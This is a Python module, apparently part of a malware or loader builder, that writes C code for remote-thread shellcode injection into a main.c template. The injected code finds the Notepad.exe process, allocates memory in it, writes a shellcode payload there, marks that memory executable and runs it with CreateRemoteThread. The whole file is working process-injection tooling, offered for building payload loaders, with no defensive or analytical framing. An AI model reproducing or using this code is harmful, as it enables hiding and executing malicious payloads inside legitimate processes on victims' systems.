def desc():
    return "Use a remote Create Thread to run the payload"

def run():
    libs = '''\
#include <psapi.h>

#define TARGET_PROC "Notepad.exe" // Target process to inject
'''
    functions = '''\
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	DWORD		adwProcesses		[1024 * 2],
				dwReturnLen1		= NULL,
				dwReturnLen2		= NULL,
				dwNmbrOfPids		= NULL;

	HANDLE		hProcess			= NULL;
	HMODULE		hModule				= NULL;

	WCHAR		szProc				[MAX_PATH];
	
	// Get the array of pid's in the system
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		return FALSE;
	}
	
	// Calculating the number of elements in the array returned 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	for (int i = 0; i < dwNmbrOfPids; i++){

		// If process is NULL
		if (adwProcesses[i] != NULL) {
			
			// Opening a process handle 
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {
				
				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					// if EnumProcessModules succeeded
					// get the name of 'hProcess', and saving it in the 'szProc' variable 
					if (GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						// Perform the comparison logic
						if (strcmp(szProcName, szProc) == 0) {
							// return by reference
							*pdwPid		= adwProcesses[i];
							*phProcess	= hProcess;
							break;	
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	// Check if pdwPid or phProcess are NULL
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID	pShellcodeAddress			= NULL;

	SIZE_T	sNumberOfBytesWritten		= NULL;
	DWORD	dwOldProtection				= NULL;

	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		return FALSE;
	}

	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		return FALSE;
	}

	// Setting memory permossions at pShellcodeAddress to be executable 
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		return FALSE;
	}

	// Running the shellcode as a new thread's entry in the remote process
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		return FALSE;
	}

	return TRUE;
}
'''
    execution = '''\
	HANDLE		hProcess				= NULL;
	DWORD		dwProcessId				= NULL;

    if (!GetRemoteProcessHandle(TARGET_PROC, &dwProcessId, &hProcess)) {
		return -1;
	}

	// Injecting the shellcode
	if (!InjectShellcodeToRemoteProcess(hProcess, pShellcode, sPayloadSize)) {
		return -1;
	}
	
	CloseHandle(hProcess);\
'''
    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{EXECUTION}}", execution)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)
    
    return